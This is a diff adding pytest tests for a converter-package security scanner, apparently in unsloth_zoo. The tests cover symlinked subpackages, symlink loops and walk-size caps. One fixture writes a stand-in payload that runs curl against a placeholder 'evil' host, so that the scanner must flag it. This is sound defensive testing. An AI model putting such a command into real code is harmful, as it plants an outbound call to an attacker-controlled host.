@@ -877,6 +877,107 @@ def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
     llama_cpp._scan_conversion_package(str(root))
 
 
+def test_a_payload_behind_a_symlinked_subpackage_is_scanned(tmp_path, monkeypatch):
+    """os.walk does not follow directory symlinks; the import machinery does.
+
+    So `conversion/linked -> elsewhere`, imported as `conversion.linked` from an
+    otherwise clean `__init__.py`, was never walked: the package read as fully
+    scanned and strict mode ran the payload with nothing reported.
+    """
+    llama_cpp = _load("llama_cpp_symlink_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    conversion = root / "conversion"
+    conversion.mkdir(parents = True)
+    (conversion / "__init__.py").write_text(
+        "from .linked import payload\n", encoding = "utf-8",
+    )
+    outside = tmp_path / "outside"
+    outside.mkdir()
+    (outside / "__init__.py").write_text(
+        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
+        encoding = "utf-8",
+    )
+    try:
+        (conversion / "linked").symlink_to(outside, target_is_directory = True)
+    except (OSError, NotImplementedError):
+        pytest.skip("this filesystem does not allow creating directory symlinks")
+
+    assert "linked/__init__.py" in llama_cpp._conversion_package_modules(str(conversion))
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_symlink_loop_in_the_package_terminates(tmp_path):
+    """Following directory symlinks is what lets a loop be walked forever.
+
+    `conversion/loop -> conversion` is a cycle os.walk will happily descend until
+    it runs out of path, so the walk has to notice a directory it already saw.
+    """
+    llama_cpp = _load("llama_cpp_symlink_loop_probe", "unsloth_zoo/llama_cpp.py")
+
+    conversion = tmp_path / "llama.cpp" / "conversion"
+    conversion.mkdir(parents = True)
+    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
+    try:
+        (conversion / "loop").symlink_to(conversion, target_is_directory = True)
+    except (OSError, NotImplementedError):
+        pytest.skip("this filesystem does not allow creating directory symlinks")
+
+    names = llama_cpp._conversion_package_modules(str(conversion))
+
+    # Terminating at all is the claim; the module is found once through the real
+    # path, and the loop contributes at most the one pass before it is noticed.
+    assert "__init__.py" in names
+    assert len(names) <= 2
+
+
+def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatch):
+    """The cap bounded what got READ, not what got WALKED.
+
+    conversion/ is attacker-supplied, so materializing the whole tree to discover
+    it was too big hands over the unbounded time and memory the cap exists to
+    deny -- and _conversion_sibling_info re-walks it before every cached export.
+    """
+    llama_cpp = _load("llama_cpp_walk_bound_probe", "unsloth_zoo/llama_cpp.py")
+
+    conversion = tmp_path / "llama.cpp" / "conversion"
+    conversion.mkdir(parents = True)
+    # One file per directory, so each directory the walk yields is one more name:
+    # stopping early has to mean visiting fewer directories, not just returning
+    # fewer names from a tree it read in full.
+    total = llama_cpp.MAX_CONVERSION_PACKAGE_FILES * 4
+    for index in range(total):
+        package = conversion / f"pkg_{index:04d}"
+        package.mkdir()
+        (package / "__init__.py").write_text("VALUE = 1\n", encoding = "utf-8")
+
+    visited = []
+    real_walk = os.walk
+
+    def counting_walk(top, *args, **kwargs):
+        for entry in real_walk(top, *args, **kwargs):
+            visited.append(entry[0])
+            yield entry
+
+    monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
+    limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1
+    names = llama_cpp._conversion_package_modules(str(conversion), limit = limit)
+
+    assert len(names) == limit
+    assert len(visited) <= limit + 1, (
+        f"walked {len(visited)} directories of {total} to learn the cap was crossed"
+    )
+
+    # Unbounded by default, so a caller that has not asked for a bound still gets
+    # the whole tree rather than a silently truncated one.
+    visited.clear()
+    assert len(llama_cpp._conversion_package_modules(str(conversion))) == total
+
+
 def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch, caplog):
     """The other half: the report must not fire on an ordinary package."""
     llama_cpp = _load("llama_cpp_cap_ok_probe", "unsloth_zoo/llama_cpp.py")
